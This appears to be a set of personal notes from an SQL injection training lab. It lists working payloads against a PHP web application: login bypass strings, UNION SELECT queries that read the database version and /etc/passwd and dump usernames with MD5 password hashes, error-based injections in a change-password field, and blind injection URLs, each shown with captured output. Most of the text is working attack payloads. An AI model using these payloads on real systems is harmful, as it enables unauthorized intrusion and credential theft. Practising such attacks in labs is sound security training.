# Login explot

bob' -- //
b%' ORDER BY 5 -- //
a' or 1=1 -- //

# List Products exploit

## Get the number of columns

' UNION SELECT 1,2,3,4,5 FROM products -- // # 1,2,... until reach a non-error message!

## Get secret database information, like the database name

' UNION SELECT 1,user(),database(),version(),load_file('/etc/passwd') FROM products -- //

[return]
    root@10.139.1.3
    sqlitraining
    8.0.39
    root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin games:x:12:100:games:/usr/games:/sbin/nologin ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin mysql:x:999:999::/var/lib/mysql:/bin/bash 

## Get the tables name from database INFORMATION_SCHEMA.TABLES

' UNION SELECT 1,(select GROUP_CONCAT(TABLE_NAME,'\n') from INFORMATION_SCHEMA.TABLES where TABLE_TYPE = 'BASE TABLE' and TABLE_SCHEMA='sqlitraining'),3,4,5 FROM products -- //

[return]
    products,
    users

## Get the columns name from table users

' union select 1,2,(select GROUP_CONCAT(column_name,'\n') from information_schema.columns where table_name='users'),4,5 -- //

[return]
    CURRENT_CONNECTIONS,
    MAX_SESSION_CONTROLLED_MEMORY,
    MAX_SESSION_TOTAL_MEMORY,
    TOTAL_CONNECTIONS,
    USER,
    description,
    fname,
    id,
    password,
    username

## Get username and password

' union select 1,(select GROUP_CONCAT(username,':',password,'\n') from users),3,4,5 -- //

[return]
    admin:21232f297a57a5a743894a0e4a801fc3,
    bob:5f4dcc3b5aa765d61d8327deb882cf99,
    ramesh:9aeaed51f2b0f6680c4ed4b07fb1a83c,
    suresh:9aeaed51f2b0f6680c4ed4b07fb1a83c,
    alice:c93239cae450631e9f55d71aed99e918,
    voldemort:856936b417f82c06139c74fa73b1abbe,
    frodo:f0f8820ee817181d9c6852a097d70d8d,
    hodor:a55287e9d0b40429e5a944d10132c93e,
    rhombus:e52848c0eb863d96bc124737116f23a4 

# Change password exploit

## In username fild try:

' or 1 in (SELECT database()) -- //
' or 1 in (SELECT version()) -- //`
' or 1 in (SELECT load_file('/etc/passwd')) -- //`
' or 1 in (SELECT GROUP_CONCAT(username,':',password,'\n') FROM users) -- //`

# Blind Injection

## Name finding exploit

http://10.139.1.3/blindsqli.php?user=admin  # FOUND
http://10.139.1.3/blindsqli.php?user=bob    # FOUND
http://10.139.1.3/blindsqli.php?user=alice  # FOUND
http://10.139.1.3/blindsqli.php?user=eve    # NOT FOUND

## Test if `id` table exists in `users`:

http://10.139.1.3/blindsqli.php?user=bob' AND SUBSTRING((select id from users LIMIT 1), 1, 1)>0 -- //
try:
    10.139.1.3/blindsqli.php?user=boba' AND SUBSTRING((select name from users where username LIKE 'b%'  LIMIT 1), 1, 1)>0 -- //

